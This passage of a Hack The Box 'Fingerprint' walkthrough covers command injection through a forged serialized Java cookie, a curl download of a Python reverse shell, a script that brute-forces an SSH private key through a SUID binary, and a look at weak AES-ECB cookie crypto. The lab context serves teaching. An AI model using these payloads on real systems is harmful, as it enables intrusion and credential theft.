Paths.get(pathname).normalize().toFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>The application read the profile file to retrieve session information on the currently connected user.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Profile.java:38</span></span><br><span class="line">profile = <span class="keyword">new</span> UserProfileStorage(user).readProfile();</span><br></pre></td></tr></table></figure><ol><li>If the connected user is <code>admin</code> then the application uses <code>grep</code> and return the logs containing the string “admin”:</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Path path = Paths.get(profileFile.getAbsolutePath());</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] content = Files.readAllBytes(path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Profile profile = (Profile) SerUtils.from(content);</span><br><span class="line"><span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">    profile.getLogs().clear();</span><br><span class="line">     <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">     profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> profile;</span><br></pre></td></tr></table></figure><p>Since we can control the username field through our cookie forging, we can very probably exploit the command injection vulnerability on <code>grep &quot; + user.getUsername();</code>.<br>For example if we set our username to <code>admin; id</code> the following will be run by the application:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">$ cat /data/sessions/admin.ser | grep admin; id</span><br></pre></td></tr></table></figure><p>Let’s create a new script to forge the malicious cookie:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/RCE.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RCE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">final</span> String cmd = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        user.setUsername(<span class="string">&quot;$(&quot;</span> + cmd + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        user.setFingerPrint(<span class="string">&quot;x&quot;</span>); <span class="comment">// setting id and password are not needed</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Injected command:\n&quot;</span> + cmd);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Cookie:\n&quot;</span> + cookie);</span><br><span class="line"></span><br><span class="line">        System.out.println(getProfileLocation());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s build it and grab our cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ javac com/admin/security/src/model/RCE.java</span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000&quot;</span></span><br><span class="line">[+] Injected <span class="built_in">command</span>:</span><br><span class="line">curl http://10.10.14.80:8000</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0AB8kKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDAp</span><br></pre></td></tr></table></figure><p>And the application crash when setting this cookie… </p><p>The problem most likely comes from this line:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:43</span></span><br><span class="line"><span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br></pre></td></tr></table></figure><p>The application cannot find the correct <code>admin.ser</code> path since our <code>username</code> variable is <code>$(curl http://10.10.14.80:8000)</code>. To bypass this issue we can take advantage of the <code>normalize()</code> being applied to the path on the following line.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:44</span></span><br><span class="line"><span class="keyword">return</span> Paths.get(pathname).normalize().toFile();</span><br></pre></td></tr></table></figure><blockquote><p>The normalize() method of java.nio.file.Path used to return a path from current path in which all redundant name elements are eliminated.<br>The precise definition of this method is implementation dependent and it derives a path that does not contain redundant name elements. In many file systems, the “.” and “..” are special names indicating the current directory and parent directory. In those cases all occurrences of “.” are considered redundant and If a “..” is preceded by a non-“..” name then both names are considered redundant.</p></blockquote><p>After a few tries we can find the correct payload that will be normalized as <code>/data/sessions/admin.ser</code> but still achieve Command Injection when stored in the <code>username</code> field. We can write this little POC based on the <code>[User.java](http://User.java)</code> source code to make sure the payload is valid:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;$(curl http://10.10.14.80:8000)/../../admin&quot;</span> + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;Original Path: &quot;</span> + pathname);</span><br><span class="line">    System.out.println(<span class="string">&quot;Normalized Path: &quot;</span> + Paths.get(pathname).normalize());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Output</span></span><br><span class="line"><span class="comment">// Received Path: /data/sessions/$(curl http://10.10.14.80:8000)/../../admin.ser</span></span><br><span class="line"><span class="comment">// Normalized Path: /data/sessions/admin.ser</span></span><br></pre></td></tr></table></figure><p>Let’s update our script with the correct payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RCE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">final</span> String cmd = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        user.setUsername(<span class="string">&quot;$(&quot;</span> + cmd + <span class="string">&quot;)/../../admin&quot;</span>);</span><br><span class="line">        user.setFingerPrint(<span class="string">&quot;x&quot;</span>); <span class="comment">// setting id and password are not needed</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Injected command:\n&quot;</span> + cmd);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Cookie:\n&quot;</span> + cookie);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Generate the cookie and open a Python listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ javac com/admin/security/src/model/RCE.java</span><br><span class="line">$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000&quot;</span></span><br><span class="line">[+] Injected <span class="built_in">command</span>:</span><br><span class="line">curl http://10.10.14.80:8000</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0ACskKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDApLy4uLy4uL2FkbWlu</span><br><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And Bingo! Once we set up our new cookie we get a callback.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.119.65 - - [18/Apr/2022 11:05:19] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>Using the same methodology we can upload a reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.80&quot;</span>,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)RCE</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000/hg8.py -o /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Injected payload:</span><br><span class="line">$(curl http://10.10.14.80:8000/hg8.py -o /tmp/hg8.py)/../../../../../admin</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0AEokKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDAvaGc4LnB5IC1vIC90bXAvaGc4LnB5KS8uLi8uLi8uLi8uLi8uLi9hZG1pbg==</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;python /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Injected payload:</span><br><span class="line">$(python /tmp/hg8.py)/../../../admin</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0ACQkKHB5dGhvbiAvdG1wL2hnOC5weSkvLi4vLi4vLi4vYWRtaW4=</span><br></pre></td></tr></table></figure><p>After setting the cookie we get our shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br><span class="line">Connection received on fingerprint.htb 48072</span><br><span class="line">www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-→john"><a href="#Pivot-www-data-→john" class="headerlink" title="Pivot www-data →john"></a>Pivot www-data →john</h3><p>After a lot of enumeration as <code>www-data</code> on the box, the only thing that catches my eye is a SUID binary belonging to <code>john</code> called <code>cmatch</code>.<br>Sounds like the perfect way to pivot to <code>john</code> user.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/usr/bin/cmatch</span><br><span class="line">www-data@fingerprint:/$ ls -la /usr/bin/cmatch</span><br><span class="line">-rwsr-sr-x 1 john john 2261627 Sep 26  2021 /usr/bin/cmatch</span><br></pre></td></tr></table></figure><p>It’s the first time I see this binary and I can’t seem to find information about it online. After a few trial and error we can understand it’s some kind of <code>grep</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/tmp$ cmatch</span><br><span class="line">Incorrect number of arguments!</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch a</span><br><span class="line">Incorrect number of arguments!</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch a b</span><br><span class="line">open a: no such file or directory</span><br><span class="line">www-data@fingerprint:/tmp$ <span class="built_in">echo</span> hg8 &gt; <span class="built_in">test</span></span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> h</span><br><span class="line">Found matches: 1</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hg</span><br><span class="line">Found matches: 1</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hgd</span><br><span class="line">Found matches: 0</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hg8</span><br><span class="line">Found matches: 1</span><br></pre></td></tr></table></figure><p>Since <code>cmatch</code> is running as <code>john</code>, we can very probably brute-force the SSH key <code>id_rsa</code> belonging to the user <code>john</code>. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa <span class="string">&quot;-----BEGIN RSA PRIVATE KEY-----&quot;</span></span><br><span class="line">Found matches: 1</span><br></pre></td></tr></table></figure><p>We can write a simple script to do this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line">chars.extend([<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot; &quot;</span>,<span class="string">&quot;\+&quot;</span>]) <span class="comment"># add special chars commonly found in SSH keys</span></span><br><span class="line"></span><br><span class="line">final_key = <span class="string">&quot;-----BEGIN RSA PRIVATE KEY-----&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span>():</span></span><br><span class="line">    <span class="keyword">global</span> final_key</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">        test_key = final_key + c</span><br><span class="line">        out = os.popen(<span class="string">f&#x27;cmatch /home/john/.ssh/id_rsa &quot;<span class="subst">&#123;test_key&#125;</span>&quot;&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> out == <span class="string">&quot;Found matches: 1\n&quot;</span>:</span><br><span class="line">            final_key += c</span><br><span class="line">            os.system(<span class="string">&#x27;cls&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(final_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:           </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bruteforce()</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><p><img src="https://user-images.githubusercontent.com/9076747/164198016-31a1ff7c-bd60-4c8c-8f03-8dedbe49c27e.gif" alt="https://user-images.githubusercontent.com/9076747/164198016-31a1ff7c-bd60-4c8c-8f03-8dedbe49c27e.gif"></p><p>Until we retrieve the full key:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,C310F9D86AE7CB5EA10046F9A215F423</span><br><span class="line"></span><br><span class="line">ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC</span><br><span class="line">KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+</span><br><span class="line">T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO</span><br><span class="line">6qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M</span><br><span class="line">g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM</span><br><span class="line">[...]</span><br><span class="line">sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE</span><br><span class="line">U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>Let’s get a more stable shell and grab the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa john@fingerprint.htb</span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 26 16:38:01 2022</span><br><span class="line">john@fingerprint:~$ cat user.txt</span><br><span class="line">8a47xxxxxxxxxxxf9f</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Looking around the files owned by <code>john</code> we stumble upon a backup folder of what looks like the main Flask app (<code>/var/backups/flask-app-secure.bak</code>). </p><p>Let’s now take a look at the backup.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ scp -i id_rsa john@fingerprint.htb:/var/backups/flask-app-secure.bak flask-app-secure.bak</span><br><span class="line">[hg8@archbook ~]$ unzip flask-app-secure.bak</span><br></pre></td></tr></table></figure><p>The <code>improvement</code> file talks about a custom crypto, it’s a good indicator as to what to look for since custom crypto are, most of time, mot super strong.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat improvements</span><br><span class="line">[x] fixed access control flaw</span><br><span class="line">[x] introduced authorization</span><br><span class="line">[x] safe authentication with custom crypto </span><br></pre></td></tr></table></figure><p>So it seems like an improved version of the original Flask app. We can also guess it’s the one running on port 8088:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">john@fingerprint:~$ netstat -an --tcp --program</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      -</span><br><span class="line">john@fingerprint:~$ curl localhost:8088 -I</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 10916</span><br><span class="line">Server: Werkzeug/1.0.1 Python/2.7.17</span><br><span class="line">Date: Mon, 18 Apr 2022 16:50:25 GMT</span><br></pre></td></tr></table></figure><p>Let’s forward the port on our machine to work on it easily:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L 8088:localhost:8088 -i id_rsa john@fingerprint.htb</span><br></pre></td></tr></table></figure><p>Reading through the source code of <code>[app.py](http://app.py)</code> we can see that an encryption logic has been added to the user cookie:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># todo: use stronger passphrase before running app</span></span><br><span class="line">SECRET = <span class="string">&quot;password&quot;</span></span><br><span class="line">KEY = <span class="string">&quot;mykey&quot;</span></span><br><span class="line"></span><br><span class="line">cryptor = AES.new(KEY, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    result = cryptor.decrypt(data.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    pad_len = <span class="built_in">ord</span>(result[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> result[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="comment"># do some padding</span></span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    pad_size = block_size - <span class="built_in">len</span>(data) % block_size</span><br><span class="line">    padding = <span class="built_in">chr</span>(pad_size) * pad_size</span><br><span class="line">    data += padding</span><br><span class="line">    <span class="keyword">return</span> cryptor.encrypt(data).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span 